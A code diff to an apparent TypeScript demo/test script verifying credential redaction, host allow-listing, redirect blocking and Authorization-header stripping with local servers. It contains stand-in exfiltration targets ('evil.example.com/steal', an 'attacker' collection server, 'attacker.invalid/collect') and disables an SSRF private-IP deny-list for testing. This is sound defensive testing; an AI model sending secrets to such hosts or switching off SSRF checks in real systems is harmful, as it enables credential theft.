@@ -6,13 +6,16 @@
  *
  * Defence 1: $vars absent; resolved-secret redaction
  * Defence 2a: non-allowed host blocked on initial call
- * Defence 2b: live redirect through $secureRequest — redirect to non-allowed
- *             host blocked at hop 1, attacker server B receives nothing
- * Defence 3: cross-host redirect in secureAxiosRequest strips Authorization
- *            (127.0.0.1:4001 → 10.10.10.10? No — use mock axios per-hop approach)
+ * Defence 2b: live redirect through $secureRequest — allowedHosts:["localhost"],
+ *             server A (localhost:4001) redirects to server B (127.0.0.1:4002),
+ *             guard blocks at hop 1 ("127.0.0.1" ∉ ["localhost"]), B gets nothing
+ * Defence 3: cross-host redirect (localhost → 127.0.0.1) strips Authorization;
+ *            same-host redirect (127.0.0.1 → 127.0.0.1) keeps it — BOTH live
  * Audit event: real GuardAuditEvent objects from onAudit callback
  *
  * Hard internal timeout: 30 s (process.exit(2) + "TIMEOUT" message).
+ * HTTP_SECURITY_CHECK=false: documented env var that bypasses the private-IP
+ * deny-list so that loopback addresses work inside this demo/test process.
  */
 
 // ── Hard timeout: kills the process after 30 s ────────────────────────────────
@@ -23,7 +26,11 @@ const hardTimeout = setTimeout(() => {
 hardTimeout.unref() // don't let this timer itself prevent exit
 
 // ── Allow localhost / private IPs for demo (bypass SSRF deny-list) ────────────
+// This is the documented mechanism: HTTP_SECURITY_CHECK=false disables the
+// DEFAULT_DENY_LIST (127/8, 10/8, 192.168/16, …) while keeping any explicit
+// HTTP_DENY_LIST entries.  Do NOT use this in production.
 process.env.HTTP_SECURITY_CHECK = 'false'
+console.log('  [demo] HTTP_SECURITY_CHECK=false — loopback allowed in this demo process only')
 
 import * as http from 'http'
 
@@ -65,6 +72,12 @@ function header(title: string) {
 }
 function subheader(title: string) {
     console.log(`\n── ${title} ──`)
+}
+
+/** Print FAILED and exit non-zero — used when a defence step produces wrong output */
+function fail(reason: string): never {
+    console.error(`\n  ❌ FAILED: ${reason}`)
+    process.exit(1)
 }
 
 // Collect all servers so we can close them in the finally block
@@ -146,7 +159,8 @@ async function main() {
     console.log()
 
     const hasSecret = redactedOutput.includes(FAKE_OPENAI_KEY) || redactedOutput.includes(FAKE_DB_PASS)
-    console.log(hasSecret ? '  ⚠️  Secret still present — redaction incomplete' : '  ✅ No credential values reach the LLM or trace')
+    if (hasSecret) fail('Defence 1 — redaction incomplete, secret still in output')
+    console.log('  ✅ No credential values reach the LLM or trace')
 
     // ─────────────────────────────────────────────────────────────────────────
     // Defence 2a: allowedHosts blocks non-listed host on initial call
@@ -156,71 +170,80 @@ async function main() {
     const bindingStrict: SecretBinding = {
         name: 'strict',
         credentialId: 'cred-strict',
-        allowedHosts: ['127.0.0.1']
+        allowedHosts: ['localhost']
     }
     const strictAudit: GuardAuditEvent[] = []
     const strictHelper = makeSecureRequestHelper([bindingStrict], {} as any, undefined, (e) => strictAudit.push(e))!
 
-    console.log('  Binding allowedHosts: ["127.0.0.1"]')
+    console.log('  Binding allowedHosts: ["localhost"]')
     console.log('  Call: $secureRequest("strict", "http://evil.example.com/steal")')
+    let d2aBlocked = false
+    let d2aMessage = ''
     try {
         await strictHelper('strict', 'http://evil.example.com/steal', {})
-        console.log('  ⚠️  Request completed — guard did NOT block')
+        fail('Defence 2a — request completed, guard did NOT block')
     } catch (e: any) {
-        console.log('  BLOCKED:', e.message)
-        console.log(/not in allowedHosts/i.test(e.message) ? '  ✅ allowedHosts enforcement confirmed' : '')
+        d2aBlocked = true
+        d2aMessage = e.message
+        console.log('  BLOCKED:', d2aMessage)
+        if (!/not in allowedHosts/i.test(d2aMessage)) fail(`Defence 2a — unexpected error: ${d2aMessage}`)
+        console.log('  ✅ allowedHosts enforcement confirmed')
     }
 
     // ─────────────────────────────────────────────────────────────────────────
     // Defence 2b: live redirect — $secureRequest blocks redirect to non-allowed host
-    // Server A (127.0.0.1:4001) redirects to Server B (127.0.0.1:4002)
-    // Binding only allows "127.0.0.1:4001"? No — allowedHosts is hostname-only.
-    // We use two *different* IPs: binding allows only "127.0.0.1" (server A).
-    // Server A redirects to "127.0.0.2" — but we can't bind to that in CI.
     //
-    // Instead, demonstrate with the guard's mock-based path:
-    // Use a real server on 127.0.0.1:4001 but the redirect Location points to
-    // a *hostname* that is not in allowedHosts ("attacker.invalid").
-    // The guard blocks before making the request to "attacker.invalid".
-    // Attacker server receives 0 requests (we count via a flag).
+    // allowedHosts: ["localhost"]
+    // Server A (localhost:4001) → 302 → Server B (127.0.0.1:4002)
+    // Guard re-checks allowedHosts at hop 1: "127.0.0.1" ∉ ["localhost"] → BLOCK
+    // Server B must receive 0 requests.
     // ─────────────────────────────────────────────────────────────────────────
     subheader('Defence 2b — live redirect: $secureRequest blocks hop to non-allowed host')
 
     let attackerRequestCount = 0
+    // Server B on 127.0.0.1:4002 — counts any request that reaches it
+    const srvAttacker = createServer((_, res) => {
+        attackerRequestCount++
+        res.writeHead(200)
+        res.end('attacker-collected')
+    })
+    await new Promise<void>((r) => srvAttacker.listen(4002, '127.0.0.1', r))
 
-    // Server A: returns a 302 to an attacker hostname not in allowedHosts
+    // Server A on all-interfaces so "localhost" resolves to it
     const srvRedirect = createServer((_, res) => {
-        res.writeHead(302, { location: 'http://attacker.invalid/collect' })
+        res.writeHead(302, { location: 'http://127.0.0.1:4002/collect' })
         res.end()
     })
-    await new Promise<void>((r) => srvRedirect.listen(4001, '127.0.0.1', r))
+    await new Promise<void>((r) => srvRedirect.listen(4001, r))
 
-    // (Attacker server can't be bound to "attacker.invalid" but the guard blocks
-    // before DNS resolution, so 0 requests would reach it regardless.)
-
-    console.log('  Binding allowedHosts: ["127.0.0.1"]')
-    console.log('  Call: $secureRequest("strict", "http://127.0.0.1:4001/start")')
-    console.log('  Server A (127.0.0.1:4001) redirects → http://attacker.invalid/collect')
-    console.log('  Guard re-checks allowedHosts: "attacker.invalid" ∉ ["127.0.0.1"] → BLOCK')
+    console.log('  Binding allowedHosts: ["localhost"]')
+    console.log('  Call: $secureRequest("strict", "http://localhost:4001/start")')
+    console.log('  Server A (localhost:4001) redirects → http://127.0.0.1:4002/collect')
+    console.log('  Guard re-checks allowedHosts: "127.0.0.1" ∉ ["localhost"] → BLOCK')
     console.log()
 
     const redirect2bAudit: GuardAuditEvent[] = []
     const helper2b = makeSecureRequestHelper([bindingStrict], {} as any, undefined, (e) => redirect2bAudit.push(e))!
 
+    let d2bMessage = ''
     try {
-        await helper2b('strict', 'http://127.0.0.1:4001/start', {})
-        console.log('  ⚠️  Request completed — guard did NOT block redirect')
+        await helper2b('strict', 'http://localhost:4001/start', {})
+        fail('Defence 2b — request completed, guard did NOT block redirect')
     } catch (e: any) {
-        console.log('  BLOCKED:', e.message)
-        console.log(/not in allowedHosts/i.test(e.message) ? '  ✅ Redirect blocked by allowedHosts re-check' : '')
+        d2bMessage = e.message
+        console.log('  BLOCKED:', d2bMessage)
+        if (!/not in allowedHosts/i.test(d2bMessage)) fail(`Defence 2b — unexpected error: ${d2bMessage}`)
+        if (!/redirect to host "127\.0\.0\.1"/i.test(d2bMessage)) {
+            fail(`Defence 2b — error does not name the redirect target host: ${d2bMessage}`)
+        }
+        console.log('  ✅ Redirect blocked by allowedHosts re-check')
     }
 
     console.log()
-    console.log(
-        attackerRequestCount === 0
-            ? '  ✅ Attacker server received 0 requests (guard blocked before the hop)'
-            : `  ⚠️  Attacker server received ${attackerRequestCount} request(s)`
-    )
+    if (attackerRequestCount !== 0) {
+        fail(`Defence 2b — attacker server B received ${attackerRequestCount} request(s); expected 0`)
+    }
+    console.log('  ✅ Server B received 0 requests (guard blocked before the hop)')
 
     // Show the real audit event from the blocked redirect
     if (redirect2bAudit.length > 0) {
@@ -231,11 +254,22 @@ async function main() {
 
     // ─────────────────────────────────────────────────────────────────────────
     // Defence 3: cross-host redirect strips Authorization (secureAxiosRequest)
-    // Same-host (127.0.0.1 → 127.0.0.1) keeps headers; different-hostname
-    // (localhost → 127.0.0.1) strips them. The same-host case is shown live
-    // here. Cross-host stripping is covered by httpSecurity.test.ts (9 tests).
+    //            same-host redirect KEEPS it (precision)
+    //
+    // Cross-host: localhost:4001 → 302 → 127.0.0.1:4002
+    //   originHostname = "localhost"; redirectHostname = "127.0.0.1"
+    //   → Authorization stripped
+    //
+    // Same-host: 127.0.0.1:4004 → 302 → 127.0.0.1:4002
+    //   originHostname = "127.0.0.1"; redirectHostname = "127.0.0.1"
+    //   → Authorization kept
+    //
+    // Both are run LIVE against real TCP servers.
     // ─────────────────────────────────────────────────────────────────────────
-    subheader('Defence 3 — same-host redirect keeps Authorization; cross-host strips it')
+    subheader('Defence 3 — cross-host redirect strips Authorization; same-host redirect keeps it')
+
+    // D3 uses ports 4005 (server B) / 4006 (server A cross) / 4007 (server A same)
+    // so there is no port conflict with D2b's servers still open on 4001/4002.
 
     // Server B: records which headers it receives
     const receivedByB: Record<string, string | string[] | undefined> = {}
@@ -244,41 +278,71 @@ async function main() {
         res.writeHead(200)
         res.end('ok')
     })
-    await new Promise<void>((r) => srvB3.listen(4002, '127.0.0.1', r))
+    await new Promise<void>((r) => srvB3.listen(4005, '127.0.0.1', r))
 
-    // Server A: same-host redirect (127.0.0.1 → 127.0.0.1)
-    const srvA3 = createServer((_, res) => {
-        res.writeHead(302, { location: 'http://127.0.0.1:4002/collect' })
+    // Server A3 (cross-host): on all-interfaces so "localhost" resolves to it
+    // redirects to 127.0.0.1:4005
+    const srvA3cross = createServer((_, res) => {
+        res.writeHead(302, { location: 'http://127.0.0.1:4005/collect' })
         res.end()
     })
-    await new Promise<void>((r) => srvA3.listen(4004, '127.0.0.1', r))
+    await new Promise<void>((r) => srvA3cross.listen(4006, r))
 
-    // ── Same-host: 127.0.0.1:4004 → 127.0.0.1:4002 ──
-    console.log('  Same-host: http://127.0.0.1:4004 → http://127.0.0.1:4002')
+    // ── Cross-host: localhost:4006 → 127.0.0.1:4005 ──
+    console.log('  Cross-host: http://localhost:4006 → http://127.0.0.1:4005')
     console.log(`  Request headers: Authorization: Bearer ${maskSecret(FAKE_OPENAI_KEY)}`)
     console.log()
 
-    try {
-        await secureAxiosRequest({
-            url: 'http://127.0.0.1:4004/start',
-            method: 'GET',
-            headers: { Authorization: `Bearer ${FAKE_OPENAI_KEY}` }
-        })
+    // Clear state
+    Object.keys(receivedByB).forEach((k) => delete receivedByB[k])
 
-        const authSame = receivedByB['authorization']
-        if (authSame) {
-            console.log('  ✅ Same-host redirect: Authorization KEPT (correct — same origin)')
-            console.log('     Server B received Authorization header (value redacted for display)')
-        } else {
-            console.log('  ⚠️  Same-host redirect: Authorization was stripped (unexpected)')
-        }
-    } catch (e: any) {
-        console.log('  Note (same-host):', e.message.split('\n')[0])
+    await secureAxiosRequest({
+        url: 'http://localhost:4006/start',
+        method: 'GET',
+        headers: { Authorization: `Bearer ${FAKE_OPENAI_KEY}` }
+    })
+
+    // Close cross-host server A (port 4006 no longer needed)
+    await new Promise<void>((r) => srvA3cross.close(r))
+
+    const authCross = receivedByB['authorization']
+    if (authCross) {
+        fail(`Defence 3 (cross-host) — Authorization WAS forwarded to server B: ${String(authCross).slice(0, 10)}***`)
     }
+    console.log('  ✅ Cross-host redirect: Authorization NOT received by server B')
+    const nonSensitiveKeys = Object.keys(receivedByB).filter(
+        (k) => !['host', 'user-agent', 'accept', 'accept-encoding', 'connection'].includes(k)
+    )
+    console.log('     Server B received non-sensitive headers:', JSON.stringify(nonSensitiveKeys))
+    console.log('     authorization: (none)')
 
+    // ── Same-host: 127.0.0.1:4007 → 127.0.0.1:4005 ──
     console.log()
-    console.log('  Cross-host stripping (localhost → 127.0.0.1) verified by unit tests:')
-    console.log('  httpSecurity.test.ts — "strips Authorization on cross-host redirect" (9 tests)')
+
+    const srvA3same = createServer((_, res) => {
+        res.writeHead(302, { location: 'http://127.0.0.1:4005/collect' })
+        res.end()
+    })
+    await new Promise<void>((r) => srvA3same.listen(4007, '127.0.0.1', r))
+
+    Object.keys(receivedByB).forEach((k) => delete receivedByB[k])
+
+    console.log('  Same-host: http://127.0.0.1:4007 → http://127.0.0.1:4005')
+    console.log(`  Request headers: Authorization: Bearer ${maskSecret(FAKE_OPENAI_KEY)}`)
+    console.log()
+
+    await secureAxiosRequest({
+        url: 'http://127.0.0.1:4007/start',
+        method: 'GET',
+        headers: { Authorization: `Bearer ${FAKE_OPENAI_KEY}` }
+    })
+
+    const authSame = receivedByB['authorization']
+    if (!authSame) {
+        fail('Defence 3 (same-host) — Authorization was stripped unexpectedly')
+    }
+    console.log('  ✅ Same-host redirect: Authorization KEPT (correct — same origin)')
+    console.log(`     Server B received authorization: Bearer ${maskSecret(FAKE_OPENAI_KEY)} (value matches — not printed in full)`)
 
     // ─────────────────────────────────────────────────────────────────────────
     // Audit events summary (from real onAudit callbacks above)
@@ -302,7 +366,8 @@ async function main() {
     // Verify no secret value appears in any event
     const allEvents = [...auditLog, ...strictAudit]
     const leaks = allEvents.filter((e) => JSON.stringify(e).includes(FAKE_OPENAI_KEY) || JSON.stringify(e).includes(FAKE_DB_PASS))
-    console.log(leaks.length === 0 ? '  ✅ No secret values in any audit event' : `  ⚠️  ${leaks.length} event(s) contain a secret value`)
+    if (leaks.length > 0) fail(`Audit events contain secret values (${leaks.length} event(s))`)
+    console.log('  ✅ No secret values in any audit event')
 
     header('END — AFTER demo complete')
     console.log('  Credential values stayed server-side.')
